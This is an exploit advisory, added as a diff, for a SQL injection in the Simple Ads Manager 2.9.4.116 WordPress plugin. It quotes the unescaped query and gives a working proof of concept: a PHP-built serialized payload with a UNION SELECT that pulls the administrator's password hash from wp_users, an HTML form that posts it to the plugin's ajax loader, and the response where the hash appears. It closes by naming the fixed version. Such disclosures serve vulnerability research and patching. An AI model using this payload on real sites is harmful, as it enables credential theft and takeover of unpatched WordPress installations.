@@ -1,0 +1,101 @@
+/*
+# Exploit Title: Simple Ads Manager 2.9.4.116 SQL Injection
+# Date: 30-12-2015
+# Software Link: https://wordpress.org/plugins/simple-ads-manager/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+ 
+1. Description
+
+$whereClause and $whereClauseT and $whereClauseW and $whereClause2W are not escaped.
+
+File: simple-ads-manager\ad.class.php
+
+$aSql = "
+	(SELECT
+	  @pid := sp.id AS pid,
+	  0 AS aid,
+	  sp.name,
+	  sp.patch_source AS code_mode,
+	  @code_before := sp.code_before AS code_before,
+	  @code_after := sp.code_after AS code_after,
+	  @ad_size := IF(sp.place_size = \"custom\", CONCAT(CAST(sp.place_custom_width AS CHAR), \"x\", CAST(sp.place_custom_height AS CHAR)), sp.place_size) AS ad_size,
+	  sp.patch_code AS ad_code,
+	  sp.patch_img AS ad_img,
+	  \"\" AS ad_alt,
+	  0 AS ad_no,
+	  sp.patch_link AS ad_target,
+	  0 AS ad_swf,
+	  \"\" AS ad_swf_flashvars,
+	  \"\" AS ad_swf_params,
+	  \"\" AS ad_swf_attributes,
+	  \"\" AS ad_swf_fallback,
+	  sp.patch_adserver AS ad_adserver,
+	  sp.patch_dfp AS ad_dfp,
+	  0 AS count_clicks,
+	  0 AS code_type,
+	  IF((sp.patch_source = 1 AND sp.patch_adserver) OR sp.patch_source = 2, -1, 1) AS ad_cycle,
+	  @aca := IFNULL((SELECT AVG(sa.ad_weight_hits*10/(sa.ad_weight*$cycle)) FROM $aTable sa WHERE sa.pid = @pid AND sa.trash IS NOT TRUE AND {$whereClause} {$whereClauseT} {$whereClause2W}), 0) AS aca
+	FROM {$pTable} sp
+	WHERE {$pId} AND sp.trash IS FALSE)
+	UNION
+	(SELECT
+	  sa.pid,
+	  sa.id AS aid,
+	  sa.name,
+	  sa.code_mode,
+	  @code_before AS code_before,
+	  @code_after AS code_after,
+	  @ad_size AS ad_size,
+	  sa.ad_code,
+	  sa.ad_img,
+	  sa.ad_alt,
+	  sa.ad_no,
+	  sa.ad_target,
+	  sa.ad_swf,
+	  sa.ad_swf_flashvars,
+	  sa.ad_swf_params,
+	  sa.ad_swf_attributes,
+	  sa.ad_swf_fallback,
+	  0 AS ad_adserver,
+	  0 AS ad_dfp,
+	  sa.count_clicks,
+	  sa.code_type,
+	  IF(sa.ad_weight, (sa.ad_weight_hits*10/(sa.ad_weight*$cycle)), 0) AS ad_cycle,
+	  @aca AS aca
+	FROM {$aTable} sa
+	WHERE sa.pid = @pid AND sa.trash IS FALSE AND {$whereClause} {$whereClauseT} {$whereClauseW})
+	ORDER BY ad_cycle
+	LIMIT 1;";
+
+http://security.szurek.pl/simple-ads-manager-294116-sql-injection.html
+
+2. Proof of Concept
+*/
+
+<?php
+$out = array();
+$out['WC'] = '1=0';
+$out['WCT'] = '';
+$out['WCW'] = ') UNION (SELECT user_pass, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2 FROM wp_users WHERE ID = 1';
+$out['WC2W'] = '';
+?>
+<form method="post" action="http://wp-url/wp-content/plugins/simple-ads-manager/sam-ajax-loader.php">
+<input type="hidden" name="action" value="load_place">
+<input type="hidden" name="id" value="0">
+<input type="hidden" name="pid" value="1">
+<input type="text" name="wc" value="<?php echo base64_encode(serialize($out)); ?>">
+<input type="submit" value="Send">
+</form>
+
+/*
+Administrator password will be here:
+
+{"success":true,"ad":"<div id='c2077_1_%here_is_password%' class='sam-container sam-place' data-sam='0'><\/div>","id":"1","pid":"%here_is_password%","cid":"c2077_1_%here_is_password%"}
+
+3. Solution:
+   
+Update to version 2.9.5.118
+*/
